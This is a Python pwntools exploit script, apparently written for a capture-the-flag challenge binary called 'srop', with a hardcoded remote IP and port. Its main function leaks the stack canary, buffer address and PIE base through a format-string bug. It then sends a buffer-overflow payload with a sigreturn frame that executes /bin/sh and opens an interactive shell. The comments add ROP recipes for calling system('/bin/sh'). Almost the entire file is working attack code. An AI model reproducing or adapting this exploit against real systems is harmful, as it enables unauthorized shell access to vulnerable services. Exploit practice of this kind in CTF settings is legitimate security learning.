#!/usr/bin/python2

# some helpful urls
# https://github.com/Naetw/CTF-pwn-tips
# http://ctfhacker.com/ctf/pwnable/2015/08/18/campctf-bitterman.html
# https://github.com/nnamon/linux-exploitation-course

# some certain helpful pwntools commands

# system_off = libc.symbols['system']
# binsh = next(libc.search('/bin/sh\x00'))
# rop2.system(next(libc.search('/bin/sh\x00'))) and print rop2.dump()

# elf = ELF('./binary')
# rop = ROP(elf)
# rop.puts(elf.got['puts'])
# rop.call(elf.symbols['main'])

#http://docs.pwntools.com/en/stable/context.html?highlight=context#pwnlib.context.ContextType.architectures

from pwn import *
import sys

#context(arch='x64', os='linux', 'endian': 'little')

LOCAL = True

HOST = "35.200.147.161"
PORT = 10001
BINARY = "./srop"
LIB = ""

shellcode="\x00hs/nib/"[::-1]
syscall_ret = 0x11b9
mov_rax_15_ret = 0x11c3

def create_frame(piebase, buffaddr, payloadsize):
    context.arch="amd64"
    frame = SigreturnFrame(kernel="amd64")
    frame.rax=0x3b
    frame.rdi=buffaddr
    frame.rsi=0
    frame.rdx=0
    frame.rsp=buffaddr+payloadsize+248
    frame.rip=piebase+syscall_ret

    return str(frame)


def exploit(r):
    # %23$p-70 = buffer address
    # Youraddress at %6$p
    # Stack cananry at %33$p 
    r.recvuntil("And you are, Mr. ?? ")
    r.sendline("%34$p.%37$p.%39$p")
    r.recvuntil("Mr. ")
    addrs=r.recvuntil(",")[:-1]
    r.recvline()
    addrs=addrs.split('.')
    # bufferaddr=int(addrs[0],16)-70
    bufferaddr=int(addrs[0],16)-112
    canary=int(addrs[1],16)
    piebase=int(addrs[2],16)-0x14b5
    
    log.success("Buffer at "+hex(bufferaddr))
    log.success("Stack canary is "+hex(canary))
    log.success("PIE Base at "+hex(piebase))

    payload=shellcode
    payload+='A'*(104-len(shellcode))
    payload+=p64(canary)
    payload+='A'*(8)
    payload+=p64(piebase+mov_rax_15_ret)
    payload+=p64(piebase+syscall_ret)
    payload+=create_frame(piebase,bufferaddr,len(payload))
    payload+=p64(bufferaddr)
    
    r.sendline(payload)
    r.interactive()
    return

if __name__=="__main__":
    #binary = ELF(BINARY, checksec = False)
    #lib = ELF(LIB, checksec = False)
    #rop = ROP(lib)

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
        exploit(r)
    else:
        LOCAL = True
        r = process(BINARY)#,env={'LD_PRELOAD':LIB}) #remove the ')#'
        print (util.proc.pidof(r))
        pause()
        exploit(r)